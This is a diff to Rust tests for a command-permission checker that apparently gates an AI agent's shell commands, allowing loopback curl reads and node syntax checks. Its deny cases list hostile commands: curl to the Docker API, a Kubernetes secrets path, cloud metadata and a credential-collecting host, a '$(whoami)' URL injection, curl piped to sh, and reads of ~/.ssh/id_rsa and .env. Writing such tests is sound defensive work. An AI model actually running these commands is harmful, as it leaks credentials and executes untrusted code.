@@ -79,6 +79,27 @@ fn public_curl_reads_are_allowed() {
 }
 
 #[test]
+fn local_dev_server_reads_are_allowed() {
+    let (space, _cleanup) = space("curl-loopback");
+    for command in [
+        "curl -s http://localhost:8080/health",
+        "curl -s http://127.0.0.1:8080/health | head -20",
+        "curl -fsS http://127.0.0.1:4173/ && curl -fsS http://127.0.0.1:4173/game.js && curl -fsS http://127.0.0.1:4173/main.js",
+    ] {
+        let result = decide(&space, command);
+        assert_eq!(
+            result.decision, "allow",
+            "{command}: {}",
+            result.reason_code
+        );
+        assert_eq!(
+            result.reason_code, "native_exact_safe_network_read",
+            "{command}"
+        );
+    }
+}
+
+#[test]
 fn risky_curl_requests_stay_reviewed() {
     let (space, _cleanup) = space("curl-review");
     for command in [
@@ -94,8 +115,9 @@ fn risky_curl_requests_stay_reviewed() {
         "curl -s -d @notes.txt https://example.com/api/items",
         "curl -s -H 'Authorization: Bearer abc' https://example.com/api",
         "curl -s -K curl.conf https://example.com/",
-        "curl -s http://localhost:8080/health",
-        "curl -s http://127.0.0.1:8080/health",
+        "curl -s http://localhost:2375/containers/json",
+        "curl -s http://127.0.0.1:8001/api/v1/secrets",
+        "curl -s http://127.0.0.1:8080/health > health.json",
         "curl -s http://169.254.169.254/latest/meta-data/",
         "curl -s \"$URL\"",
         "curl -s \"https://example.com/$(whoami)\"",
@@ -199,5 +221,56 @@ fn urls_carrying_credential_shapes_stay_reviewed() {
         let command = format!("curl -s 'https://collector.example.com/c?{query}'");
         let result = decide(&space, &command);
         assert_ne!(result.decision, "allow", "{command}");
+    }
+}
+
+/// `node --check` only parses. An agent checks a served script by piping its
+/// own dev server's response into it, or checks the file on disk first.
+#[test]
+fn syntax_checks_of_served_and_local_scripts_are_allowed() {
+    let (space, _cleanup) = space("node-check");
+    std::fs::write(space.cwd.join("app.js"), "console.log(1);\n").unwrap();
+    for (command, reason) in [
+        (
+            "curl -fsS http://localhost:4173/ && curl -fsS http://localhost:4173/app.js | node --check && curl -fsS http://localhost:4173/styles.css | wc -c",
+            "native_exact_safe_network_read",
+        ),
+        (
+            "node --check app.js && curl -fsS http://localhost:4173/app.js | wc -c && curl -fsS http://localhost:4173/styles.css | wc -c",
+            "native_exact_safe_network_read",
+        ),
+        ("node --check app.js", "native_exact_safe_command"),
+        ("node -c app.js 2>&1 | head -3", "native_exact_safe_command"),
+    ] {
+        let result = decide(&space, command);
+        assert_eq!(
+            result.decision, "allow",
+            "{command}: {}",
+            result.reason_code
+        );
+        assert_eq!(result.reason_code, reason, "{command}");
+    }
+    for command in [
+        "curl -fsS http://localhost:4173/app.js | node",
+        "curl -fsS http://localhost:4173/app.js | node -",
+        "curl -fsS http://localhost:4173/app.js | sh",
+        "curl -fsS http://localhost:4173/app.js | node --check -r ./preload.js",
+        "curl -fsS http://localhost:4173/app.js -o app.js && node --check app.js",
+        "curl -fsS http://localhost:2375/info | node --check",
+        "node app.js --check",
+        "node --check -r ./preload.js app.js",
+        "node -r ./preload.js --check app.js",
+        "node --import ./loader.mjs --check app.js",
+        "node --check -e 'process.exit(0)'",
+        "node --check ~/.ssh/id_rsa",
+        "node --check .env",
+        "NODE_OPTIONS=--require=./preload.js node --check app.js",
+    ] {
+        let result = decide(&space, command);
+        assert_ne!(
+            result.decision, "allow",
+            "{command}: {}",
+            result.reason_code
+        );
     }
 }
